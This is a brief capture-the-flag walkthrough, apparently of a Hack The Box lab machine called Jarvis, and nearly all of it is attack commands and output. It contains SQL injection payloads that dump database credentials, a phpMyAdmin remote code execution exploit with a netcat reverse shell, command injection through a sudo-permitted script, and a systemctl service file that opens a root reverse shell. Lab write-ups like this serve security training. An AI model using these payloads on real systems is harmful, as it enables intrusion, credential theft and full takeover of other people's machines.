# Jarvis

### Nmap

```
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Web Enum

```
http://supersecurehotel.htb/phpmyadmin/

http://10.10.10.143:64999/

phpMyAdmin - Version 4.8.0

http://supersecurehotel.htb/room.php?cod=??? -> SQLi
```

### Exploitation

```bash
# sqli poc
http://supersecurehotel.htb/room.php?cod=-1 UNION SELECT NULL,'sqli','sqli','sqli','sqli',NULL,NULL--

# version
10.1.37-MariaDB-0+deb9u1

# found user table with 'group_concat()'
/room.php?cod=-1 UNION SELECT NULL,'0',group_concat(table_schema),group_concat(table_name),'0',NULL,NULL from information_schema.tables  where table_schema='mysql'--
# return column of user table
/room.php?cod=-1 UNION SELECT NULL,'0',group_concat(column_name),'0','0',NULL,NULL from information_schema.columns WHERE table_name = 'user'--

# return user cred
/room.php?cod=-1 UNION SELECT NULL,group_concat(user),group_concat(password),'sqli','sqli',NULL,NULL from mysql.user--

# user cred
DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0:imissyou

# found public exploit
phpMyAdmin 4.8.1 - Remote Code Execution (RCE) | php/webapps/50457.py

# get shell
python3 50457.py $IP 80 /phpmyadmin DBadmin imissyou 'nc -nv 10.10.14.29 443 -e /bin/bash'
```

### Priv Esc

```bash

# sudo -l
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py

# run as pepper and get shell for pepper

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
$(/tmp/shell)

# found SUID exploitable
-rwsr-x--- 1 root pepper 171K Feb 17  2019 /bin/systemctl

# craft service file
cat > /var/tmp/root.service << EOF
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.29/9999 0>&1'

[Install]
WantedBy=multi-user.target
EOF

# enable service
/bin/systemctl enable /var/tmp/root.service

# activate service and get root shell
/bin/systemctl start root
```
